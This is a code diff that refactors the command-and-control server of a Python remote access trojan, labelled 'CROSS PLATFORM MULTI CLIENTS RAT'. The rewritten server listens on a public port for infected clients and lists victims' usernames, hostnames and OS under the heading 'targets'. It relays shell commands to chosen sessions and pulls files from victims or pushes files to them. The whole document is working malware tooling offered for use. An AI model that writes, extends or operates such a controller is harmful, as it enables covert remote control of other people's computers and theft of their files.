@@ -3,177 +3,217 @@ import json
 import threading
 import platform
 import os
+import time
+
+# --- Pystyle Integration ---
 print("[*] Checking Requirements Module.....")
-if platform.system().startswith("Windows"):
-    try:
-        from pystyle import *
-    except ImportError:
-        os.system("python -m pip install pystyle -q -q -q")
-        from pystyle import *
-elif platform.system().startswith("Linux"):
-    try:
-        from pystyle import *
-    except ImportError:
-        os.system("python3 -m pip install pystyle -q -q -q")
-        from pystyle import *
+try:
+    from pystyle import *
+except ImportError:
+    cmd = "python -m pip install pystyle -q" if platform.system() == "Windows" else "python3 -m pip install pystyle -q"
+    os.system(cmd)
+    from pystyle import *
+
 banner = Center.XCenter(r"""
 *************************************************************************************************
-*     :::    ::: :::::::::: :::        ::::::::::: ::::::::  :::::::::      ::: :::::::::::     *
-*     :+:    :+: :+:        :+:            :+:    :+:    :+: :+:    :+:   :+: :+:   :+:         *
-*     +:+    +:+ +:+        +:+            +:+    +:+    +:+ +:+    +:+  +:+   +:+  +:+         *
-*     +#++:++#++ +#++:++#   +#+            +#+    +#+    +:+ +#++:++#:  +#++:++#++: +#+         *
-*     +#+    +#+ +#+        +#+            +#+    +#+    +#+ +#+    +#+ +#+     +#+ +#+         *
-*     #+#    #+# #+#        #+#            #+#    #+#    #+# #+#    #+# #+#     #+# #+#         *
-*     ###    ### ########## ########## ########### ########  ###    ### ###     ### ###         *
-*                                   CROSS PLATFORM MULTI CLIENTS RAT                            *
-*                             Coded By: Machine1337, Forked by Neos Helios                      *
+* :::    ::: :::::::::: :::        ::::::::::: ::::::::  :::::::::      ::: :::::::::::     *
+* :+:    :+: :+:        :+:            :+:    :+:    :+: :+:    :+:   :+: :+:   :+:         *
+* +:+    +:+ +:+        +:+            +:+    +:+    +:+ +:+    +:+  +:+   +:+  +:+         *
+* +#++:++#++ +#++:++#   +#+            +#+    +#+    +:+ +#++:++#:  +#++:++#++: +#+         *
+* +#+    +#+ +#+        +#+            +#+    +#+    +#+ +#+    +#+ +#+     +#+ +#+         *
+* #+#    #+# #+#        #+#            #+#    #+#    #+# #+#    #+# #+#     #+# #+#         *
+* ###    ### ########## ########## ########### ########  ###    ### ###     ### ###         *
+* CROSS PLATFORM MULTI CLIENTS RAT                            *
+* Coded By: Machine1337, Forked by Neos Helios                      *
 *************************************************************************************************
 """)
-os.system("cls||clear")
-print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
-ips = []
-client_usernames = {}
-targets = []
-connections = {}
+
+def clear_screen():
+    os.system("cls||clear")
+
+# --- Configuration & Globals ---
+BIND_IP = "0.0.0.0"
+BIND_PORT = 8080    # Matches your client's port-hopping list
+BUFFER_SIZE = 8192
+
+clients = []        # List of socket objects
+ips = []            # List of (ip, port) tuples
+client_metadata = {} # IP -> Dictionary of host/user info
+stop_threads = False
+
+# --- Core Networking ---
+def send_data(target, data):
+    try:
+        jsondata = json.dumps(data)
+        target.send(jsondata.encode('utf-8'))
+    except:
+        pass
+
 def recv_data(target):
     data = ''
     while True:
         try:
-            data = data + target.recv(1024).decode().rstrip()
+            chunk = target.recv(BUFFER_SIZE).decode('utf-8')
+            if not chunk: return None
+            data += chunk
             return json.loads(data)
         except ValueError:
             continue
-def send_data(target, data):
-    jsondata = json.dumps(data)
-    target.send(jsondata.encode())
+        except:
+            return None
+
+# --- File Transfer Logic ---
 def download_file(target, file_name):
-    f = open(file_name, 'wb')
-    target.settimeout(1)
-    chunk = target.recv(1024)
-    while chunk:
-        f.write(chunk)
-        try:
-            chunk = target.recv(1024)
-        except socket.timeout as e:
-            break
-    target.settimeout(None)
-    f.close()
+    """ Server receives file from Client """
+    try:
+        print(Colors.yellow + f"[*] Downloading {file_name}...")
+        with open(file_name, 'wb') as f:
+            target.settimeout(3.0)
+            while True:
+                try:
+                    chunk = target.recv(BUFFER_SIZE)
+                    if not chunk: break
+                    f.write(chunk)
+                except socket.timeout:
+                    break
+        target.settimeout(None)
+        print(Colors.green + f"[+] File saved: {os.path.abspath(file_name)}")
+    except Exception as e:
+        print(Colors.red + f"[-] Download Error: {e}")
+
 def upload_file(target, file_name):
-    f = open(file_name, 'rb')
-    target.send(f.read())
-#coded By Machine1337, forked by Neos Helios....If u like the tool...Follow me on github: @machine1337, @ARCH66H
+    """ Server sends file to Client """
+    if not os.path.exists(file_name):
+        print(Colors.red + "[-] Error: Local file not found.")
+        return
+    try:
+        print(Colors.yellow + f"[*] Uploading {file_name}...")
+        with open(file_name, 'rb') as f:
+            while True:
+                chunk = f.read(BUFFER_SIZE)
+                if not chunk: break
+                target.send(chunk)
+        time.sleep(0.5) # Allow buffer to clear
+        print(Colors.green + "[+] Upload Complete.")
+    except Exception as e:
+        print(Colors.red + f"[-] Upload Error: {e}")
+
+# --- Shell Menu ---
 def shell(target, ip):
     while True:
-        command = input(Colors.yellow+"\n[*] Shell@%s " % str(ip))
+        command = input(Colors.yellow + f"\n[*] Shell@{ip}# ").strip()
+        if not command: continue
+        
         send_data(target, command)
+
         if command == 'q':
             break
+        
         if command == 'help':
             print(Colorate.Vertical(Colors.red_to_purple, """
-             ****  SHELL COMMANDS MAIN MENU ****
-             
-    1. download filename  | Download File From Client
-    2. upload filename    | upload file To the Client
-    3. q                  | Back To The Server Main Menu 
-    4. kill               | Terminate the client shell
-                   More Features Will Be Added
-                   Follow:- github.com/machine1337
-                                """, 2))
-        elif command[:8] == "download":
-            download_file(target, command[9:])
-        elif command[:6] == 'upload':
-            upload_file(target, command[7:])
+    **** SHELL COMMANDS ****
+    1. download <file> | Pull file from target
+    2. upload <file>   | Push file to target
+    3. cd <dir>        | Change directory
+    4. kill            | Close connection
+    5. q               | Back to Main Menu
+            """, 2))
+            
         elif command == 'kill':
             target.close()
-            targets.remove(target)
-            ips.remove(ip)
+            idx = clients.index(target)
+            clients.pop(idx)
+            ips.pop(idx)
+            print(Colors.red + "[!] Connection terminated.")
             break
+            
+        elif command.startswith("download "):
+            download_file(target, command[9:].strip())
+            
+        elif command.startswith("upload "):
+            upload_file(target, command[7:].strip())
+            
         else:
-            message = recv_data(target)
-            print(message)
-
-def server():
-    global clients, connections
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    while True:
-        if stop_threads:
-            break
-        s.settimeout(1)
-        try:
-            target, ip = s.accept()
-            if ip[0] in connections:
-                target.close()
+            response = recv_data(target)
+            if response:
+                print(Colors.white + str(response))
             else:
-                info = recv_data(target)
-                hostname, mac_address, username = info.split(',')
-                client_data = {'HostName': hostname, 'MAC_Address': mac_address, 'Username': username}
-                client_usernames[ip[0]] = client_data
-                targets.append(target)
+                print(Colors.red + "[-] Lost connection to client.")
+                break
+
+# --- Background Listener ---
+def server_listener(s):
+    global stop_threads
+    while not stop_threads:
+        try:
+            s.settimeout(1.0)
+            target, ip = s.accept()
+            
+            # Receive initial metadata handshake
+            meta = recv_data(target)
+            if meta:
+                clients.append(target)
                 ips.append(ip)
-                connections[ip[0]] = target
-                print(Colors.green+"{} ({}:{}) has connected!".format(username, ip[0], ip[1])+"\n[*] Server Command (Type help):- ",end="")
-                clients += 1
+                client_metadata[ip[0]] = meta
+                
+                print(Colors.green + f"\n[+] {meta.get('User')}@{meta.get('Host')} ({ip[0]}) connected!")
+                print(Colors.green_to_yellow + "[*] Main Menu (Type 'help'): ", end="")
         except socket.timeout:
             continue
-        except KeyboardInterrupt:
-            break
-    print(Colors.red+"\n[*] Server shutting down...")
-    for target in targets:
-        target.close()
-    s.close()
-def listclients():
-    print("\n--------------------------------------------------------------------------------------")
-    print("SESSIONS  |  HOSTNAME         |  MAC ADDRESS           | USERNAME         | IP ADDRESS")
-    for count, ip in enumerate(ips):
-        if ip[0] in client_usernames:
-            target_info = client_usernames[ip[0]]
-            print("{:<10}|{:<12}       {:<15}           {:<11}       {}:{}".format(count, target_info['HostName'],
-                                                                                   target_info['MAC_Address'],
-                                                                                   target_info['Username'], ip[0],
-                                                                                   str(ip[1])))
-        else:
-            print(
-                "{:<10}|{:<12}         {:<15}           {:<11}       {}:{}".format(count, 'Unknown', 'None', 'Unknown',
-                                                                                   ip[0], str(ip[1])))
-        count += 1
-    print("---------------------------------------------------------------------------------------")
-def selectclient():
-    try:
-        num = int(command[8:])
-        tarnum = targets[num]
-        tarip = ips[num]
-        shell(tarnum, tarip)
-    except:
-        print(Colors.red+"\n[*] No session id under that number")
+        except:
+            pass
+
+# --- Main Logic ---
 if __name__ == '__main__':
+    clear_screen()
+    print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
+    
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind(("127.0.0.1", 4444))  # change ur ip and port here
-    s.listen(5)
-    clients = 0
-    stop_threads = False
-    print(Colors.yellow+"\n[*] Server Listening On: ")
-    t1 = threading.Thread(target=server)
-    t1.start()
+    
     try:
+        s.bind((BIND_IP, BIND_PORT))
+        s.listen(10)
+        print(Colors.cyan + f"[*] Listening on {BIND_IP}:{BIND_PORT}...")
+        
+        # Start background thread
+        t1 = threading.Thread(target=server_listener, args=(s,), daemon=True)
+        t1.start()
+        
         while True:
-            command = input(Colorate.Vertical(Colors.green_to_yellow, "\n[*] Server Command (Type help):- ", 2))
-            if command == "targets":
-                listclients()
-            elif command == "help":
+            cmd = input(Colorate.Vertical(Colors.green_to_yellow, "\n[*] Main Menu# ", 2)).strip()
+            
+            if cmd == "help":
                 print(Colorate.Vertical(Colors.red_to_purple, """
-                ****  SERVER COMMANDS MAIN MENU ****
-    1. targets   ---> Display Connected Clients
-    2. session   ---> go to specific client shell like session 0
-    3. exit      ---> Terminate the server  
-            """, 2))
-            elif command[:7] == "session":
-                selectclient()
-            elif command == "exit":
+    **** MAIN MENU ****
+    1. targets   | Show connected clients
+    2. session X | Interact with client ID (e.g., session 0)
+    3. exit      | Close server
+                """, 2))
+            
+            elif cmd == "targets":
+                print("\n" + "="*80)
+                print(f"{'ID':<4} | {'IP ADDRESS':<15} | {'USER':<15} | {'HOST':<15} | {'OS':<10}")
+                print("-" * 80)
+                for i, ip_addr in enumerate(ips):
+                    m = client_metadata.get(ip_addr[0], {})
+                    print(f"{i:<4} | {ip_addr[0]:<15} | {m.get('User', '???'):<15} | {m.get('Host', '???'):<15} | {m.get('OS', '???'):<10}")
+                print("="*80)
+                
+            elif cmd.startswith("session "):
+                try:
+                    num = int(cmd[8:])
+                    shell(clients[num], ips[num][0])
+                except:
+                    print(Colors.red + "[-] Invalid session ID.")
+                    
+            elif cmd == "exit":
                 stop_threads = True
-                t1.join()
+                print(Colors.red + "[*] Shutting down...")
                 break
-    except KeyboardInterrupt:
-        stop_threads = True
-        t1.join()
-#coded By Machine1337, forked by Neos Helios....If u like the tool...Follow me on github: @machine1337, @ARCH66H
+                
+    except Exception as e:
+        print(Colors.red + f"[-] Critical Error: {e}")
+    finally:
+        for c in clients: c.close()
+        s.close()
